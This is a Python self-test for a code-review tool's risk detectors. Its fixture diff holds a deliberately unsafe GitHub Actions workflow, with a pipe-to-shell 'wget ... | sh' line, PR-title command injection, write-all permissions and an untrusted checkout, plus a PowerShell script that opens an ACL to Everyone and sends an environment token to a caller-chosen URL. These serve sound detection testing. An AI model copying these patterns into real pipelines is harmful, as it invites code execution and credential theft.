#!/usr/bin/env python3
"""Self-test for the second required-coverage DCOIR Review patch layer."""

from __future__ import annotations

from types import SimpleNamespace

import dcoir_review_required_runtime_patch_v2 as v2
import dcoir_review_required_runtime_patches as required
import dcoir_review_runtime_patches as runtime
import dcoir_review_strict_runtime_patches as strict
import openrouter_pr_review_pareto_context as pareto


def apply_all() -> None:
    runtime.apply_pareto_context_module(pareto)
    strict.apply_pareto_context_module(pareto)
    required.apply_pareto_context_module(pareto)
    v2.apply_pareto_context_module(pareto)


def test_ps_acl_survives_required_budget() -> None:
    apply_all()
    diff = """diff --git a/.github/workflows/dcoir-v2-test.yml b/.github/workflows/dcoir-v2-test.yml
index 0000000..1111111 100644
--- /dev/null
+++ b/.github/workflows/dcoir-v2-test.yml
@@ -0,0 +1,16 @@
+name: dcoir-v2-test
+on:
+  pull_request_target:
+permissions: write-all
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - run: wget https://example.invalid/install.sh | sh
+      - run: bash -c "${{ github.event.pull_request.title }}"
diff --git a/tools/dcoir-v2-acl.ps1 b/tools/dcoir-v2-acl.ps1
index 0000000..2222222 100644
--- /dev/null
+++ b/tools/dcoir-v2-acl.ps1
@@ -0,0 +1,8 @@
+param($OutputDirectory, $CallbackUrl)
+$acl = Get-Acl -LiteralPath $OutputDirectory
+$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
+$acl.AddAccessRule($rule)
+Set-Acl -LiteralPath $OutputDirectory -AclObject $acl
+Invoke-RestMethod -Uri $CallbackUrl -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }
"""
    sentinels = pareto.detect_risk_sentinels(diff, 5)
    sentinel_kinds = [v2._sentinel_kind(sentinel) for sentinel in sentinels]
    assert v2.PS_ACL_KIND in sentinel_kinds, sentinel_kinds
    config = SimpleNamespace(max_inline_comments=5)
    augmented = pareto.hardened.add_risk_sentinel_fallback_findings([], sentinels, config)
    finding_kinds = [v2._semantic_kind(finding) for finding in augmented]
    assert finding_kinds[:5] == [
        "yaml_pull_request_target",
        "yaml_broad_write",
        "yaml_untrusted_checkout",
        "yaml_shell_pipe",
        v2.PS_ACL_KIND,
    ], finding_kinds
    assert len(augmented) == 5


def test_token_forwarding_is_not_called_hardcoded() -> None:
    finding = {
        "path": "tools/dcoir-v2-acl.ps1",
        "line": 6,
        "title": "Hardcoded bearer token sent to request-controlled URL",
        "body": "The Authorization header is set to a literal Bearer token value [redacted-secret].",
        "_anchored_line_text": "Invoke-RestMethod -Uri $CallbackUrl -Headers @{ Authorization = \"Bearer $env:DCOIR_TOKEN\" }",
        "fix_guidance": {
            "language": "powershell",
            "notes": "Replace the hardcoded token with a governed token forwarding policy.",
        },
    }
    normalized = v2._normalize_comment_finding(finding)
    guidance = normalized.get("fix_guidance", {})
    combined = "\n".join(
        str(value or "")
        for value in (normalized.get("title"), normalized.get("body"), guidance.get("notes"))
    ).lower()
    assert "environment token" in combined, combined
    assert "hardcoded" not in combined, combined
    assert "literal bearer" not in combined, combined
    assert "redacted" not in combined, combined


def test_yaml_validation_is_single_line() -> None:
    validation = v2._validation_for_path(".github/workflows/dcoir-v2-test.yml", "yaml_untrusted_checkout")
    assert "<<'PY'" not in validation
    assert "\n" not in validation
    assert validation.startswith("python3 -c ")


def test_final_renderer_uses_required_v2_normalization() -> None:
    class FakeBase:
        def __init__(self) -> None:
            self.build_inline_comment = lambda finding, _model, _config: f"STRICT {finding.get('title')}\n{finding.get('validation', '')}"
            self._dcoir_strict_original_build_inline_comment = self.original_build

        def original_build(self, finding: dict[str, object], _model: str, _config: object) -> str:
            return f"{finding.get('title')}\n{finding.get('validation', '')}"

    fake_module = SimpleNamespace(base=FakeBase(), hardened=SimpleNamespace())
    v2.apply_pareto_context_module(fake_module)
    comment = fake_module.base.build_inline_comment(
        {
            "path": ".github/workflows/dcoir-v2-test.yml",
            "line": 4,
            "title": "Privileged `pull_request_target` workflow context",
            "body": "",
            "validation": "python3 - <<'PY'\nPY",
            "_anchored_line_text": "permissions: write-all",
        },
        "model",
        SimpleNamespace(),
    )
    assert "GitHub Actions workflow grants write permissions" in comment, comment
    assert "<<'PY'" not in comment, comment
    assert not comment.startswith("STRICT"), comment


def main() -> None:
    test_ps_acl_survives_required_budget()
    test_token_forwarding_is_not_called_hardcoded()
    test_yaml_validation_is_single_line()
    test_final_renderer_uses_required_v2_normalization()
    print("dcoir_review_required_runtime_patch_v2_selftest passed")


if __name__ == "__main__":
    main()
